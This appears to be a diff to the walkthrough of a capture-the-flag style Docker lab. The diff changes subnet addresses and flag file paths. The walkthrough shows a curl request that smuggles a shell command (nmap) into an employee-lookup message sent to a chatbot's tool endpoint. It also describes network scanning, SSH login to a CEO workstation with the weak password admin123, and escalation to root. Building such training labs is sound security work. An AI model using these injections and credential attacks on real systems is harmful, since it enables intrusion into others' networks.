@@ -28,7 +28,7 @@ The Docker Compose setup creates an internal network with three containers:
 - Commands execute as root due to setuid Python
 
 ### Lateral Movement: CEO SSH Access
-- From chatbot container, scan network: `nmap -sT 172.20.0.0/16`
+- From chatbot container, scan network: `nmap -sT 172.30.0.0/16`
 - Find CEO workstation at port 22
 - SSH with weak credentials: `ssh ceo@ceo-workstation` (password: admin123)
 - Same password works for root: `su root` (password: admin123)
@@ -47,8 +47,8 @@ The Docker Compose setup creates an internal network with three containers:
 - Root flag: `/root/root.txt`
 
 **CEO Workstation:**
-- User flag: `/home/ceo/Desktop/user_flag.txt` 
-- Root flag: `/root/CEO_Files/root_flag.txt`
+- User flag: `/home/ceo/user.txt` 
+- Root flag: `/root/root.txt`
 
 ## Sensitive Files
 
@@ -68,7 +68,7 @@ curl -X POST http://localhost:8000/chat-tools \
 # 2. Network discovery from chatbot
 curl -X POST http://localhost:8000/chat-tools \
   -H "Content-Type: application/json" \
-  -d '{"message": "Look up employee '\''test'\''; nmap -sT 172.20.0.0/24 | head -20 #"}'
+  -d '{"message": "Look up employee '\''test'\''; nmap -sT 172.30.0.0/24 | head -20 #"}'
 
 # 3. SSH to CEO workstation
 ssh -p 2222 ceo@localhost
